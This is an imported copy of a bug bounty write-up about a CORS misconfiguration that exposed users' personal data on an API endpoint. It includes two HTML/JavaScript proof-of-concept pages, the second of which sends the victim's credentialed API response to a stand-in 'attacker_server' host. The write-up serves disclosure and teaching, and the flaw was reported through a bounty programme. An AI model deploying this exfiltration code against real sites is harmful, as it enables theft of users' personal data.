---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-06_my-first-bug-bounty-cors-misconfiguration.md
original_filename: 2024-08-06_my-first-bug-bounty-cors-misconfiguration.md
title: 'My First Bug Bounty: CORS Misconfiguration'
category: documents
detected_topics:
- cors
- command-injection
tags:
- imported
- documents
- cors
- command-injection
language: en
raw_sha256: 619b6b297c098b0cf38cb8ccd23fb5dab04e2cffc696fb96210ddd66fb2870b2
text_sha256: c541de29212fa1b35dfc9c2beb086f31f745e7709896665df1ff7e81fc28e480
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# My First Bug Bounty: CORS Misconfiguration

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-06_my-first-bug-bounty-cors-misconfiguration.md
- Source Type: markdown
- Detected Topics: cors, command-injection
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `619b6b297c098b0cf38cb8ccd23fb5dab04e2cffc696fb96210ddd66fb2870b2`
- Text SHA256: `c541de29212fa1b35dfc9c2beb086f31f745e7709896665df1ff7e81fc28e480`


## Content

---
title: "My First Bug Bounty: CORS Misconfiguration"
url: "https://r0b0ts.medium.com/my-first-bug-bounty-cors-misconfiguration-3e6f38835c4e"
authors: ["r0b0ts (@gimhyeo52126424)"]
bugs: ["CORS misconfiguration"]
bounty: "250"
publication_date: "2024-08-06"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 99
scraped_via: "browseros"
---

# My First Bug Bounty: CORS Misconfiguration

My First Bug Bounty: CORS Misconfiguration
r0b0ts
Follow
3 min read
·
Aug 6, 2024

283

4

Hello, it is r0b0ts.

In this post, I am going to talk about my first bug bounty story.

Press enter or click to view image in full size
CORS misconfiguration

I think CORS misconfiguration vulnerability is not hard to find. But, if this vulnerability occurs on a particular endpoint that includes users’ personal data, external attacker can access to the victim’s data and the data can be leaked.

Press enter or click to view image in full size

As you can see above picture, there is a CORS misconfiguration vulnerability exploit scenario. First, attacker makes malicious URL contain CORS exploit code and victim access the URL. Then, victim sends their sensitive data to attacker as exploit code. In here, the response of vulnerable API should include sensitive data.

So, if the endpoints that include sensitive data, there should be CORS policy.

Then, how I can find it?

Get r0b0ts’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

At first, I just debugging API manually. When I check login page API, I found API to get user’s personal data. By chance, I thought that I should check that origin header for CORS misconfiguration. Fortunately, there are no CORS policy in request header. There are a lot of information are included in response body and also contain user’s personal data. I think that because of the a lot of data, developer missed to check CORS request header.

Press enter or click to view image in full size

As shown above request and response packet, attacker can manipulate origin header. I input ‘https://naver.com’ to origin header and successfully get ‘Access-Control-Allow-Origin: https://naver.com’, ‘Access-Control-Allow-Credentials: true’.

‘Access-Control-Allow-Credentials: true’ means that when attacker access to response from external, attacker can get response with victim’s credentials. So, there should be ‘Access-Control-Allow-Credentials: true’ in response header for trigger CORS misconfiguration vulnerability.

<html>
  <body>
  <h2>CORS POC</h2>
  <div id="demo">
  <button type="button" onclick="cors()">Exploit</button>
  </div>
  <script>
  function cors() {
  var xhr = new XMLHttpRequest();
  xhr.responseType = "blob";
  xhr.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
  document.getElementById("demo").innerHTML = alert(this.response);
  }
  };
  xhr.open("GET",
  "https://vulenrable_host/v2/user/", true);
  xhr.withCredentials = true;
  xhr.send();
  }
  </script>
  </body>
 </html>

It is POC code on attacker’s malicious server. To show that external attacker can access to the response of vulnerable API, I just pop up sensitive data.

Press enter or click to view image in full size

POC code successfully conducted and pop up with sensitive user’s data.

<html>
  <body>
  <h2>CORS PoC</h2>
  <div id="demo">
  <button type="button" onclick="cors()">Exploit</button>
  </div>
  <script>
  function cors() {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
  appendToFile(this.responseText);
  }
  };
  xhr.open("GET", "https://vulenrable_host/v2/user/", true);
  xhr.withCredentials = true;
  xhr.send();
  }

  function appendToFile(content) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://attacker_server/saveData", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("content=" + encodeURIComponent(content)); 
  }
  </script>
  </body>
</html>

For really trigger the vulnerabilty, I upgraded the POC code. In this code, attacker can get sensitive data directly from user to attacker’s server. If above code are conducted, access log will be left to the attacker’s server with user’s sensitive data.

With this POC, I finally get accepted and resolved in intigriti.
